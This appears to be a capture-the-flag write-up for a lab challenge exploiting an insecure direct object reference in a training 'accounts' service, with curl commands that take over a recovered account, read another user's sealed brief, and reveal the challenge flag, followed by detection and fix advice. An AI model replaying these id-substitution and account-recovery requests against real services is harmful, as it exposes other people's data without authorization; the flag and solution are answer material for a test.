# T02.4 — Someone else's assignment

> **Category:** 1. Training · **Points:** 100 · **Difficulty:** medium
> **Solved by:** me (manual)

## Where this happens

![Range map — three segments, hosts and services](../docs/img/segments.png)

Primary service for this card: `accounts.training`. The map shows which segment it sits in and how
traffic reaches it (browser terminal → kali → rowan-dev → SOCKS relay → 10.77.x).

## At a glance

| | |
|---|---|
| **Vulnerability / bug class** | IDOR / missing object-level authorization — the brief route authenticates the session but never checks that the assignment belongs to the caller |
| **Tools** | `curl`, `jq` |
| **Attack surface** | `GET http://accounts.training:8080/api/assignments`, `GET /api/assignments/{id}/brief` (10.77.40.30) |
| **Prerequisite** | A valid rehearsal session for `rhea.moss` (from T02.3) |
| **Flag** | `FLAG{50676f831e62140a}` |

**What you are about to read:** the archetypal broken-object-level-authorization pattern — a list
scoped honestly to the caller, a detail endpoint that accepts any id, and a hint
(`paired_assignment_id`) handing you the id worth asking for.

## Objective

> From the recovered account, use the assignment service to obtain another operator's sealed
> rehearsal brief.

`rhea.moss` has a receiving assignment, `dax.hale` the dispatch half of the same rehearsal, both
named in rhea's handover. The card is whether the brief route honours that boundary.

## Background you need

- **Authentication vs authorization.** The endpoint checks *who you are* (a valid session for
  `rhea.moss`) and stops; it never asks whether *this object* is one rhea may read. That is IDOR:
  the id in the URL is the authorization decision.
- **Scoped queries are not authorization.** `WHERE owner = session.subject` is filtering; the detail
  route does a primary-key lookup and returns whatever it finds.
- **Sequential ids make it trivial** (`ASG-204`, `ASG-317`) — and the caller's own record advertises
  the counterpart's id. "Sealed" briefs are sealed only by the rule in front of them.

## Walkthrough

### 1. Recon — the authenticated surface

```bash
H=http://accounts.training:8080
curl -sS -b /tmp/rhea.jar $H/api/assignments | jq .   # one assignment: ASG-204, rhea.moss
```

```json
{"assignments": [{"assignment_id": "ASG-204", "owner": "rhea.moss",
                  "paired_assignment_id": "ASG-317", "revision": 3,
                  "area": "Bay 4 receiving"}]}
```

Correctly scoped to the caller — but it volunteers the counterpart's id, because the desk wants the
two halves correlated. `GET /api/handover` (T02.3) says the same and points at
`GET /api/assignments/{id}/brief`.

### 2. Finding the flaw — the brief route takes any id

Read your own brief first — the control case — then substitute the paired identifier, no other
change:

```bash
curl -sS -b /tmp/rhea.jar $H/api/assignments/ASG-204/brief   # own: "Receive three sealed parcels
#                                                     from CR-17 and retain the manifest audit."
curl -sS -i -b /tmp/rhea.jar $H/api/assignments/ASG-317/brief
# {"assignment_id": "ASG-317", "owner": "dax.hale",
#  "brief": "Release DL-204 only after the Bay 4 courier and seal values agree.",
#  "flag": "FLAG{50676f831e62140a}"}
```

`200` with another operator's content — and the body states `owner: dax.hale`: the server knew who
owned it and never compared that with the session subject.

### 3. The chain, for the record

```bash
H=http://accounts.training:8080
curl -sS -H 'Content-Type: application/json' -d '{"account":"rhea.moss"}' $H/api/recovery/lookup
curl -sS $H/api/directory/staff/STF-204/assignment
curl -sS -c /tmp/rhea.jar -H 'Content-Type: application/json' -d \
 '{"account":"rhea.moss","case_fragment":"CASE-7Q4M","staff_detail":"Blue cabinet 17"}' \
 $H/api/recovery/redeem
curl -sS -b /tmp/rhea.jar $H/api/assignments/ASG-317/brief    # T02.4
```

### 4. Getting the flag

The same response carries it: `FLAG{50676f831e62140a}`, accepted on the third global attempt. The
brief also names the next desk — `DL-204`, courier `CR-17`, "seal values" — which is `T01.x`.

## Why this works (the vulnerability explained)

The service decides at the wrong granularity: it classifies routes as "authenticated" and
"anonymous", applies a session check to the former, and never asks `may(subject, "read",
/api/assignments/ASG-317)`. The list answers a *scoped query*; the detail answers a *primary-key
lookup* and returns whatever it finds.

Three things make this the archetype: ids are sequential, the caller's own record advertises the
target id, and the response states the owner — the server held `dax.hale` and still answered
`rhea.moss`. That bug is the *absence* of code, so there is no payload to detect. Correct design
authorizes every object read against the subject (or an explicit grant) in the data layer, so no
route can forget.

## Detection and fix

- **Detection:** one session requesting two assignment ids it does not own in sequence; `200`s where
  `object.owner != session.subject` (log both, alert on the mismatch). With no payload, the reliable
  control is an authorization assert in code, not a signature.
- **Fix:** add the ownership predicate (`WHERE id = ? AND owner = ?`), or model the pairing as an
  explicit grant; apply it centrally and test that a second user's session gets `404` everywhere.

## Notes and dead ends

- Values are from the identity-desk lane artifacts: the list, both brief texts, `owner: dax.hale`
  and the flag (JSON trimmed).
- The paired id is reconnaissance, not just a shortcut: it names `dax.hale` as dispatch owner and
  ties the rehearsal to `DL-204` — follow it instead of guessing ids.
- `dax.hale` has no session here (no recovery path was found), so the IDOR is the only way to the
  dispatch brief. Do not re-run the redeem: it is a one-time state change.
